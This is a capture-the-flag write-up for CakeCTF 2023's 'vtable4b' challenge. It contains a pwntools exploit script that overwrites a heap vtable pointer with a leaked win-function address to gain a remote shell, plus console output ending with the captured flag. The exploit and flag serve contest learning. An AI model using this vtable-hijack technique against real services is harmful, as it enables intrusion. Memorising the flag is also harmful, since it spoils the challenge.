# vtable4b

## Description

> Do you understand what vtable is?
>
> nc vtable4b.2023.cakectf.com 9000
>
> \* The flag exists somewhere in / directory.

no attachment

## Solution

```python
# solver.py
from pwn import *

io = remote("vtable4b.2023.cakectf.com", 9000)

io.recvuntil(b"<win> = ")
res = io.recvlineS()

win = int(res, base=16)

log.info(f"win: {hex(win)}")

io.sendlineafter(b"> ", b"3")

io.recvuntil(b"  [ address ]    [ heap data ]")

for _ in range(7):
    res = io.recvline()


message_addr = int(res[:14], 16)

log.info(f"message_addr: {hex(message_addr)}")

io.sendlineafter(b"> ", b"2")

payload = b""
payload += p64(win)
payload += b"A" * (32 - 8)
payload += p64(message_addr)

io.sendlineafter(b"Message: ", payload)
io.sendlineafter(b"> ", b"1")

io.interactive()
```

```console
$ python3 solver.py
[+] Opening connection to vtable4b.2023.cakectf.com on port 9000: Done
[*] win: 0x5617babea61a
[*] message_addr: 0x5617bac32eb0
[*] Switching to interactive mode
[+] You're trying to use vtable at 0x5617bac32eb0
[+] Congratulations! Executing shell...
$ $ ls /
app
bin
boot
dev
etc
flag-806cb9c9719379667ca5616d9c8210f1.txt
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ cat /flag-806cb9c9719379667ca5616d9c8210f1.txt
CakeCTF{vt4bl3_1s_ju5t_4n_arr4y_0f_funct1on_p0int3rs}
```
